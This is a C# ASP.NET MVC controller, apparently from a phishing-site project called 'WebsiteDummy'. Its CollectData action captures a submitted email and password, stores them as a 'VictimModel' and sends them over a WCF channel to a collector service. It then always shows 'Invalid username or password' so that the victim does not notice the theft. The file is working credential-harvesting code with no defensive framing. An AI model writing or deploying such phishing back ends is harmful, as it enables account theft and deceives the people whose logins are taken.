using Common;
using Contracts.DatabaseModel;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.ServiceModel;
using System.Web;
using System.Web.Hosting;
using System.Web.Mvc;

namespace WebsiteDummy.Controllers
{
	public class HomeController : Controller
	{
		static IFlag channel = null;

		public ActionResult Index()
		{

			return View();
		}

		[HttpPost]
		public ActionResult CollectData(string email, string password)
		{

			if (email == string.Empty || password == string.Empty)
			{

				ViewBag.error = "Invalid username or password";
				return View("Index");
			}


			VictimModel vm = new VictimModel(email, password, DateTime.Now);

			ChannelFactory<IFlag> factory = new ChannelFactory<IFlag>(new NetTcpBinding(), new EndpointAddress("net.tcp://localhost:4000/IFlag"));
			if (channel == null)
			{
				channel = factory.CreateChannel();
			}

			channel.SendData(vm);

			ViewBag.error = "Invalid username or password";
			return View("Index");
		}
	}
}